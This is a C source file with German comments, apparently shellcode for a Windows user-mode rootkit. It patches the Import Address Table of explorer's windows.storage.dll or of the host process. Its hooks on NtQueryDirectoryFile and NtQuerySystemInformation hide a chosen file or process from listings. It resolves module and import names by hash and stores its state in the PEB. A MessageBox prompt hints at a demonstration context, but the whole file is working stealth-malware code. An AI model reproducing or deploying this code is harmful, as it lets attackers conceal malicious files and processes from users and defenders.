#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>

#define UmsGetShellcodeData() *((PSHELLCODE_DATA *)(__readgsqword(0x60) + 0x10))

typedef enum _SHELLCODE_ACTION {
	ShellcodeActionHideFile,
	ShellcodeActionHideProcess
}SHELLCODE_ACTION, *PSHELLCODE_ACTION;

typedef FARPROC(WINAPI *GetProcAddress_T)(
	HMODULE hModule,
	LPCSTR lpProcName
);

typedef int(WINAPI *MessageBoxW_T)(
	HWND    hWnd,
	LPCWSTR lpText,
	LPCWSTR lpCaption,
	UINT    uType
);

typedef BOOL(WINAPI *VirtualProtect_T)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flNewProtect,
	PDWORD lpflOldProtect
);

typedef struct _SHELLCODE_DATA {
	SHELLCODE_ACTION Action;
	DWORD HiddenProcessId;
	WCHAR HiddenFile[MAX_PATH];
	PVOID KernelBaseAddr;
	PVOID NtdllAddr;
	GetProcAddress_T GetProcAddressAddr;
	MessageBoxW_T MessageBoxW;
	PVOID Reserved;
}SHELLCODE_DATA, *PSHELLCODE_DATA;

typedef struct _FILE_ID_BOTH_DIR_INFORMATION {
	ULONG         NextEntryOffset;
	ULONG         FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG         FileAttributes;
	ULONG         FileNameLength;
	ULONG         EaSize;
	CCHAR         ShortNameLength;
	WCHAR         ShortName[12];
	LARGE_INTEGER FileId;
	WCHAR         FileName[1];
} FILE_ID_BOTH_DIR_INFORMATION, *PFILE_ID_BOTH_DIR_INFORMATION;

typedef struct _LDR_DATA_TABLE_ENTRY64
{
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	WORD LoadCount;
	WORD TlsIndex;

	union
	{
		LIST_ENTRY HashLinks;
		struct
		{
			PVOID SectionPointer;
			ULONG CheckSum;
		};
	};

	union
	{
		ULONG TimeDateStamp;
		PVOID LoadedImports;
	};

	PVOID EntryPointActivationContext;
	PVOID PatchInformation;
	LIST_ENTRY ForwarderLinks;
	LIST_ENTRY ServiceTagLinks;
	LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY64, *PLDR_DATA_TABLE_ENTRY64;

typedef NTSTATUS(NTAPI *NtQuerySystemInformation_T)(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	IN OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength OPTIONAL
);

typedef NTSTATUS(NTAPI *NtQueryDirectoryFile_T)(
	IN HANDLE FileHandle,
	IN HANDLE Event OPTIONAL,
	IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
	IN PVOID ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	OUT PVOID FileInformation,
	IN ULONG Length,
	IN FILE_INFORMATION_CLASS FileInformationClass,
	IN BOOLEAN ReturnSingleEntry,
	IN PUNICODE_STRING FileName OPTIONAL,
	IN BOOLEAN RestartScan
);

//Helper Funktionen (http://www.cse.yorku.ca/~oz/hash.html)
DWORD UmsHashA(PSTR str)
{
	DWORD hash = 5381;
	INT c;

	while (c = *str++)
		hash = ((hash << 5) + hash) + c; /* hash * 33 + c */

	return hash;
}

DWORD UmsHashW(PWSTR str)
{
	DWORD hash = 5381;
	INT c;

	while (c = *str++)
		hash = ((hash << 5) + hash) + c; /* hash * 33 + c */

	return hash;
}

NTSTATUS UmsResolveDllBase(
	IN DWORD moduleHash,
	OUT PVOID *outModuleBase
)
/*++

Routine Description:

	Findet eine geladene DLL im aktuellen Prozessraum.

Arguments:

	DWORD moduleHash:
		Numerischer Hash des DLL Namens.

	PVOID *outModuleBase:
		Ein Zeiger, der bei Erfolg die Basisaddresse der DLL erhält.

Return Value:

	STATUS_NOT_FOUND: Wenn die DLL nicht gefunden werden kann.
	STATUS_SUCCESS: Wenn erfolgreich.

--*/
{
	NTSTATUS retVal = STATUS_NOT_FOUND;
	PPEB peb = (PPEB)__readgsqword(0x60);
	PLIST_ENTRY listHead, listEntry;
	PLDR_DATA_TABLE_ENTRY64 moduleEntry;
	WCHAR moduleBuf[MAX_PATH];

	//Nutze die InMemoryOrderModuleList im Process Environment Block
	//um die geladenen DLLs zu enumerieren.
	listHead = &peb->Ldr->InMemoryOrderModuleList;
	listEntry = listHead->Flink;

	for (; listEntry != listHead; listEntry = listEntry->Flink)
	{
		moduleEntry = (PLDR_DATA_TABLE_ENTRY64)listEntry;

		if (moduleEntry->BaseDllName.Length / sizeof(WCHAR) >= MAX_PATH)
			continue;

		for (DWORD i = 0; i < MAX_PATH; i++)
			moduleBuf[i] = 0;

		for (DWORD i = 0; i < moduleEntry->BaseDllName.Length / sizeof(WCHAR); i++)
			moduleBuf[i] = moduleEntry->BaseDllName.Buffer[i];

		if (UmsHashW(moduleBuf) == moduleHash)
		{
			retVal = STATUS_SUCCESS;
			*outModuleBase = moduleEntry->DllBase;
			break;
		}
	}

	return retVal;
}

//Hook für den NtQuerySystemInformation syscall
//Dieser wird genutzt, um diverse Systeminformationen
//zu beziehen. Darunter Informationen über Prozesse.
NTSTATUS UmsNtQuerySystemInformationHook(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	IN OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength OPTIONAL
)
{
	NTSTATUS retVal;
	PSHELLCODE_DATA data = UmsGetShellcodeData();
	SYSTEM_PROCESS_INFORMATION *current, *previous = NULL;
	DWORD nextOffset;

	// Rufe den originale NtQuerySystemInformation syscall auf

	retVal = ((NtQuerySystemInformation_T)data->Reserved)(
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength
	);

	if (!NT_SUCCESS(retVal))
		goto Done;

	//Wurden Prozessinformationen angefragt?
	if (SystemInformationClass != SystemProcessInformation)
		goto Done;

	current = SystemInformation;

	//Iteriere über die Liste der Prozesse
	do
	{
		nextOffset = current->NextEntryOffset;

		//Handelt es sich um den Prozess, der versteckt werden soll?
		if (current->UniqueProcessId == data->HiddenProcessId)
		{
			//Der erste Prozess in der Liste ist immer der Systemprozess
			if (!previous)
				break;

			//Entferne den Prozess von der Linked List
			if (nextOffset)
			{
				previous->NextEntryOffset += nextOffset;
			}
			else
			{
				previous->NextEntryOffset = 0;
			}
		}

		previous = current;
		current = (PVOID)((DWORD_PTR)current + nextOffset);

	} while (nextOffset);

Done:

	return retVal;
}

//Hook für den NtQueryDirectoryFile syscall.
//Dieser wird genutzt, um Informationen über Dateien
//in einem Verzeichnis zu beziehen.
NTSTATUS UmsNtQueryDirectoryFileHook(
	HANDLE FileHandle,
	HANDLE Event,
	PIO_APC_ROUTINE ApcRoutine,
	PVOID ApcContext,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID FileInformation,
	ULONG Length,
	FILE_INFORMATION_CLASS FileInformationClass,
	BOOLEAN ReturnSingleEntry,
	PUNICODE_STRING FileName,
	BOOLEAN RestartScan
)
{
	NTSTATUS retVal;
	PSHELLCODE_DATA data = UmsGetShellcodeData();
	WCHAR fileName[MAX_PATH] = { 0 };
	PFILE_ID_BOTH_DIR_INFORMATION current, previous = NULL;
	DWORD nextOffset;

	//1. Originales NtQueryDirectoryFile aufrufen

	retVal = ((NtQueryDirectoryFile_T)data->Reserved)(
		FileHandle,
		Event,
		ApcRoutine,
		ApcContext,
		IoStatusBlock,
		FileInformation,
		Length,
		FileInformationClass,
		ReturnSingleEntry,
		FileName,
		RestartScan
	);

	if (!NT_SUCCESS(retVal))
		goto Done;

	//explorer verwendet beim Auflisten von Dateien immer Info Klasse 37 (FileIdBothDirectoryInformation)
	if (FileInformationClass != 37 || ReturnSingleEntry == TRUE)
		goto Done;

	current = FileInformation;

	//2. Iteriere über die Liste der Dateien im Verzeichnis
	do
	{
		nextOffset = current->NextEntryOffset;

		if (current->FileNameLength / sizeof(WCHAR) >= MAX_PATH)
			goto Done;

		for (DWORD i = 0; i < current->FileNameLength / sizeof(WCHAR); i++)
			fileName[i] = current->FileName[i];

		//3. Ist die aktuelle Datei die Datei, die versteckt werden soll?
		if (UmsHashW(data->HiddenFile) == UmsHashW(fileName))
		{
			//4. Entferne die Datei von der (Linked) List
			if (previous == NULL)
			{
				for (DWORD i = 0; i < Length - nextOffset; i++)
					((PBYTE)FileInformation)[i] = ((PBYTE)FileInformation)[i + nextOffset];
			}
			else if(nextOffset)
			{
				previous->NextEntryOffset += nextOffset;
			}
			else
			{
				previous->NextEntryOffset = 0;
			}

			break;
		}

		previous = current;
		current = (PVOID)((DWORD_PTR)current + nextOffset);

	} while (nextOffset);

Done:

	return retVal;
}

//Wird für Shellcode Template benötigt
UINT_PTR GetRIP(VOID);

//Spezieller Entry-Point zur Generierung von Shellcode
//https://github.com/merlinepedra/ShellcodeTemplate/tree/main
//SEC(text, B) VOID Entry(
VOID Entry(
	IN PSHELLCODE_DATA data
)
{
	DWORD_PTR hookTarget = 0, pebPtr;
	PIMAGE_DOS_HEADER dosHeader;
	PIMAGE_NT_HEADERS ntHeaders;
	PIMAGE_DATA_DIRECTORY dataDir;
	PIMAGE_IMPORT_DESCRIPTOR descriptor, targetModule = NULL;
	PIMAGE_THUNK_DATA first, original;
	PSTR currentModuleName;
	VirtualProtect_T virtualProtect;
	MessageBoxW_T messageBoxW;
	PVOID hookedFunction = NULL;
	DWORD oldProtect;

	pebPtr = (DWORD_PTR)__readgsqword(0x60);

	//1. Funktionen auflösen

	virtualProtect = (VirtualProtect_T)data->GetProcAddressAddr(
		data->KernelBaseAddr,
		"VirtualProtect"
	);

	messageBoxW = data->MessageBoxW;

	if (data->Action == ShellcodeActionHideFile)
	{
		hookedFunction = (PVOID)data->GetProcAddressAddr(
			data->NtdllAddr,
			"NtQueryDirectoryFile"
		);

		//windows.storage.dll
		if (!NT_SUCCESS(UmsResolveDllBase(0x4fd4ae9d, &hookTarget)))
			goto Done;
	}
	else
	{
		hookedFunction = (PVOID)data->GetProcAddressAddr(
			data->NtdllAddr,
			"NtQuerySystemInformation"
		);

		hookTarget = *((PDWORD_PTR)(pebPtr + 0x10)); //ImageBase Feld in PEB
	}

	//2. Zielfunktion in der IAT (Import Address Table) des Zielmoduls
	//suchen und durch unsere Hook ersetzen.

	dosHeader = (PIMAGE_DOS_HEADER)hookTarget;

	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		goto Done;

	ntHeaders = (PIMAGE_NT_HEADERS)(hookTarget + dosHeader->e_lfanew);

	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
		goto Done;

	dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	if (!dataDir->VirtualAddress || !dataDir->Size)
		goto Done;

	descriptor = (PIMAGE_IMPORT_DESCRIPTOR)(hookTarget + dataDir->VirtualAddress);

	for (; descriptor->Name; descriptor++)
	{
		currentModuleName = (PSTR)(hookTarget + descriptor->Name);

		if (UmsHashA(currentModuleName) != 0x22d3b5ed) //ntdll.dll
			continue;

		targetModule = descriptor;
		break;
	}

	if (!targetModule)
		goto Done;

	first = (PIMAGE_THUNK_DATA)(hookTarget + targetModule->FirstThunk);
	original = (PIMAGE_THUNK_DATA)(hookTarget + targetModule->OriginalFirstThunk);

	for (; original->u1.AddressOfData; first++, original++)
	{
		if (first->u1.Function != hookedFunction)
			continue;

		messageBoxW(NULL, L"Zielfunktion gefunden! Ok druecken zum Fortfahren.", L"[Shellcode]", MB_OK);

		virtualProtect(
			&first->u1.Function, 
			8, 
			PAGE_READWRITE, 
			&oldProtect
		);

		data->Reserved = first->u1.Function;

		first->u1.Function = data->Action == ShellcodeActionHideFile ?
			UmsNtQueryDirectoryFileHook 
			:
			UmsNtQuerySystemInformationHook;

		virtualProtect(
			&first->u1.Function,
			8,
			oldProtect,
			&oldProtect
		);

		virtualProtect(
			(PVOID)(pebPtr + 0x10),
			8,
			PAGE_READWRITE,
			&oldProtect
		);

		*((PVOID *)(pebPtr + 0x10)) = data;

		break;
	}

Done:

	return;
}